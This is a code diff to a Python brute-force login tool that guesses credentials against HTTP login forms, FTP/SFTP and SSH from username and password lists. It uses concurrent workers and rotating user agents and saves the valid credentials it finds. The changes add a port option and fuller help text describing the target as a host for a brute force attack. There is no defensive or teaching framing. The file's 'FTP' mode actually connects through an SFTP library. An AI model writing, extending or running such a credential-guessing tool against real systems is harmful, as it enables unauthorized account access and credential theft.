@@ -10,7 +10,8 @@ from colorama import Fore, Style, init
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import os
 
-print('''    _____ _            _ _____                                    _  _____                _             
+print('''
+   _____ _            _ _____                                    _  _____                _             
   / ____| |          | |  __ \                                  | |/ ____|              | |            
  | (___ | |_ ___  ___| | |__) |_ _ ___ _____      _____  _ __ __| | |     _ __ __ _  ___| | _____ _ __ 
   \___ \| __/ _ \/ _ \ |  ___/ _` / __/ __\ \ /\ / / _ \| '__/ _` | |    | '__/ _` |/ __| |/ / _ \ '__|
@@ -23,7 +24,7 @@ init()
 # Set up logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-def http_brute_force(url, usernames, passwords, request_delay, verbose, max_workers, timeout, save_file):
+def http_brute_force(url, usernames, passwords, request_delay, verbose, max_workers, timeout, save_file, port):
     ua = UserAgent()
 
     def try_login(username, password):
@@ -60,7 +61,7 @@ def http_brute_force(url, usernames, passwords, request_delay, verbose, max_work
                 executor.shutdown(wait=False)
                 break
 
-def ftp_brute_force(host, usernames, passwords, port=21, request_delay=5, verbose=False, save_file=None):
+def ftp_brute_force(host, usernames, passwords, port, request_delay, verbose, save_file):
     def try_login(username, password):
         try:
             with pysftp.Connection(host, username=username, password=password, port=port) as sftp:
@@ -81,7 +82,7 @@ def ftp_brute_force(host, usernames, passwords, port=21, request_delay=5, verbos
                 return
             time.sleep(request_delay)
 
-def ssh_brute_force(host, usernames, passwords, port=22, request_delay=5, verbose=False, save_file=None):
+def ssh_brute_force(host, usernames, passwords, port, request_delay, verbose, save_file):
     def try_login(username, password):
         try:
             ssh = paramiko.SSHClient()
@@ -110,20 +111,23 @@ def ssh_brute_force(host, usernames, passwords, port=22, request_delay=5, verbos
 
 def main():
     parser = argparse.ArgumentParser(description='Brute force tool for HTTP, FTP, and SSH')
-    parser.add_argument('--http', action='store_true', help='Use HTTP brute force')
-    parser.add_argument('--ftp', action='store_true', help='Use FTP brute force')
-    parser.add_argument('--ssh', action='store_true', help='Use SSH brute force')
-    parser.add_argument('-u', '--username', help='Single username')
-    parser.add_argument('-U', '--username-file', help='Path to the username file')
-    parser.add_argument('-p', '--password', help='Single password')
-    parser.add_argument('-P', '--password-file', help='Path to the password file')
-    parser.add_argument('-H', '--host', required=True, help='Target host')
-    parser.add_argument('-d', '--delay', type=int, default=5, help='Request delay in seconds between each login attempt')
-    parser.add_argument('--port', type=int, help='Port number')
-    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode for detailed logging')
-    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers')
-    parser.add_argument('-t', '--timeout', type=int, default=5, help='Timeout for each login attempt in seconds')
-    parser.add_argument('-s', '--save', help='File to save valid credentials')
+    
+    parser.add_argument('--http', action='store_true', help='Use HTTP brute force for web login forms')
+    parser.add_argument('--ftp', action='store_true', help='Use FTP brute force for FTP login')
+    parser.add_argument('--ssh', action='store_true', help='Use SSH brute force for SSH login')
+    
+    parser.add_argument('-u', '--username', help='Single username for brute forcing (e.g. admin)')
+    parser.add_argument('-U', '--username-file', help='Path to the username file (e.g. usernames.txt)')
+    parser.add_argument('-p', '--password', help='Single password for brute forcing (e.g. password123)')
+    parser.add_argument('-P', '--password-file', help='Path to the password file (e.g. passwords.txt)')
+    
+    parser.add_argument('-H', '--host', required=True, help='Target host (IP or domain) for brute force attack')
+    parser.add_argument('-d', '--delay', type=int, default=5, help='Delay in seconds between each login attempt (default: 5)')
+    parser.add_argument('--port', type=int, help='Port number for the target service (default: 80 for HTTP, 21 for FTP, 22 for SSH)')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode for more detailed logging')
+    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers (default: 10)')
+    parser.add_argument('-t', '--timeout', type=int, default=5, help='Timeout in seconds for each login attempt (default: 5)')
+    parser.add_argument('-s', '--save', help='File to save valid credentials (e.g. valid_credentials.txt)')
 
     args = parser.parse_args()
 
@@ -145,15 +149,16 @@ def main():
     if not usernames or not passwords:
         parser.error("At least one username and one password must be provided.")
 
+    port = args.port  # Use the provided port number
+
     if args.http:
-        http_brute_force(args.host, usernames, passwords, args.delay, args.verbose, args.workers, args.timeout, args.save)
+        http_brute_force(args.host, usernames, passwords, args.delay, args.verbose, args.workers, args.timeout, args.save, port or 80)
     elif args.ftp:
-        ftp_brute_force(args.host, usernames, passwords, port=args.port or 21, request_delay=args.delay, verbose=args.verbose, save_file=args.save)
+        ftp_brute_force(args.host, usernames, passwords, port or 21, args.delay, args.verbose, args.save)
     elif args.ssh:
-        ssh_brute_force(args.host, usernames, passwords, port=args.port or 22, request_delay=args.delay, verbose=args.verbose, save_file=args.save)
+        ssh_brute_force(args.host, usernames, passwords, port or 22, args.delay, args.verbose, args.save)
     else:
         parser.print_help()
 
 if __name__ == "__main__":
     main()
-
